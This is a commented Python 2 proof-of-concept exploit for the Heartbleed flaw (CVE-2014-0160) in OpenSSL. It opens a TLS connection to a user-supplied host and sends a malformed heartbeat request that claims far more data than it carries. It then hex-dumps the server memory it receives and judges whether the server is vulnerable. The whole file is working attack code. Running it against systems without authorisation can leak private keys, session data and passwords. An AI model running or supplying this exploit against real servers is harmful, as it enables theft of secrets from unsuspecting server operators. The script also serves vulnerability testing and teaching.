#!/usr/bin/python

# Quick and dirty demonstration of CVE-2014-0160 by Jared Stafford (jspenguin@jspenguin.org)
# The author disclaims copyright to this source code
# Minor customizations by Malik Mesellem (@MME_IT)
# Many more customizations by Rich Moulton

import sys
import struct
import socket
import time
import select
import re


# This quick function eliminates spaces and newlines, and decodes our hex into 'ASCII'
def request2bin(x):
    return x.replace(' ', '').replace('\n', '').decode('hex')

# This packet announces a client that wishes to do a key exchange
# 16 indicates a client key exchange
# 03 indicates the major version of the TLS protocol (TLS v1)
# 02 indicates the minor version of the TLS protocol (TLS v1.1)
# The rest of the packet initiates the key exchange
client_key_exchange = request2bin('''
16 03 02 00  dc 01 00 00 d8 03 02 53
43 5b 90 9d 9b 72 0b bc  0c bc 2b 92 a8 48 97 cf
bd 39 04 cc 16 0a 85 03  90 9f 77 04 33 d4 de 00
00 66 c0 14 c0 0a c0 22  c0 21 00 39 00 38 00 88
00 87 c0 0f c0 05 00 35  00 84 c0 12 c0 08 c0 1c
c0 1b 00 16 00 13 c0 0d  c0 03 00 0a c0 13 c0 09
c0 1f c0 1e 00 33 00 32  00 9a 00 99 00 45 00 44
c0 0e c0 04 00 2f 00 96  00 41 c0 11 c0 07 c0 0c
c0 02 00 05 00 04 00 15  00 12 00 09 00 14 00 11
00 08 00 06 00 03 00 ff  01 00 00 49 00 0b 00 04
03 00 01 02 00 0a 00 34  00 32 00 0e 00 0d 00 19
00 0b 00 0c 00 18 00 09  00 0a 00 16 00 17 00 08
00 06 00 07 00 14 00 15  00 04 00 05 00 12 00 13
00 01 00 02 00 03 00 0f  00 10 00 11 00 23 00 00
00 0f 00 01 01                                  
''')

# This is our heartbeat packet.
# The 18 indicates a Heartbeat Content Type
# The 0302, once again, is the TLS Version (v1.1)
# The next two bytes are the length of your heartbeat packet (00 03)
# 01 means this is a heartbeat request
# 40 00 is the length of the request.
# Because nothing follows, we have lied about the request length, and
# created a malformed packet.
malformed_heartbeat = request2bin('''
18 03 02 00 03
01 40 00
''')


def dump_hex(message_payload):
    
    # Take each start_index in the message payload
    for start_index in xrange(0, len(message_payload), 16):

        # Take every 16 bytes
        sixteen_bytes = [chunk for chunk in message_payload[start_index: start_index + 16]]

        # Add every byte into a space-delimited string
        hex_representation = ' '.join('%02X' % ord(one_byte) for one_byte in sixteen_bytes)

        # Print out the ASCII representation if there is one
        ASCII_representation = ''.join((
                            ASCII_letter if 32 <= ord(ASCII_letter) <= 126 else '.')for ASCII_letter in sixteen_bytes)
        print '  %04x: %-48s %s' % (start_index, hex_representation, ASCII_representation)

    # Print newline at the end
    print


def get_msg_from_socket(some_socket, msg_length, time_out=5):

    # Expected time by which we'll receive a response
    end_time = time.time() + time_out

    received_data = ''

    remaining_msg = msg_length

    while remaining_msg > 0:

        read_time = end_time - time.time()

        if read_time < 0:
            return None
        # Use select() system call to get...
        read_socket, write_socket, error_socket = select.select([some_socket], [], [], time_out)

        # If some_socket was ready within the time_out
        if some_socket in read_socket:

            data = some_socket.recv(remaining_msg)

            # EOF?
            if not data:
                return None

            else:
                received_data += data
                remaining_msg -= len(data)

        else:
            # Socket was not ready in time
            pass

    return received_data
        

def recv_msg(a_socket):

    header = get_msg_from_socket(a_socket, 5)

    if header is None:
        print 'Unexpected EOF receiving record header - server closed connection'
        return None, None, None

    # Try '!BHH' instead for network order, u_char, u_short, u_short
    message_type, message_version, message_length = struct.unpack('>BHH', header)
    message_payload = get_msg_from_socket(a_socket, message_length, 10)

    if message_payload is None:
        print 'Unexpected EOF receiving record payload - server closed connection'
        return None, None, None

    print ' ... received message: type = %d, ver = %04x, length = %d' % (
        message_type, message_version, len(message_payload))

    return message_type, message_version, message_payload


def send_n_catch_heartbeat(our_socket):

    our_socket.send(malformed_heartbeat)

    while True:

        content_type, content_version, content_payload = recv_msg(our_socket)

        if content_type is None:
            print 'No heartbeat response received, server likely not vulnerable'
            return False

        # Note Type 24 is the Heartbeat ContentType
        if content_type == 24:
            print 'Received heartbeat response:'
            dump_hex(content_payload)
            # We asked for ~16kb, but only sent three
            if len(content_payload) > 3:
                print 'WARNING: server returned more data than it should - server is vulnerable!'
            else:
                print 'Server processed malformed heartbeat, but did not return any extra data.'
            return True

        # Per RFC 5246, 21 is the Alert ContentType
        if content_type == 21:
            print 'Received alert:'
            dump_hex(content_payload)
            print 'Server returned error, likely not vulnerable'
            return False


def main(rhost):
    port = 443

    if not rhost:
        print("\nPlease provide a remote host IP.")
        return

    local_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    print 'Connecting...'
    sys.stdout.flush()
    local_socket.connect((rhost, port))

    print 'Sending Client Hello...'
    sys.stdout.flush()
    local_socket.send(client_key_exchange)

    print 'Waiting for Server Hello...'
    sys.stdout.flush()

    while True:
        type, version, payload = recv_msg(local_socket)
        if not type:
            print 'Server closed connection without sending Server Hello.'
            return
        # Look for server hello (Type 22) done message (0x0E).
        if type == 22 and ord(payload[0]) == 0x0E:
            break

    print 'Sending heartbeat request...'
    sys.stdout.flush()
    local_socket.send(malformed_heartbeat)
    send_n_catch_heartbeat(local_socket)

if __name__ == '__main__':
    remote_host = raw_input("What is the IP of the remote host? ")
    main(remote_host)
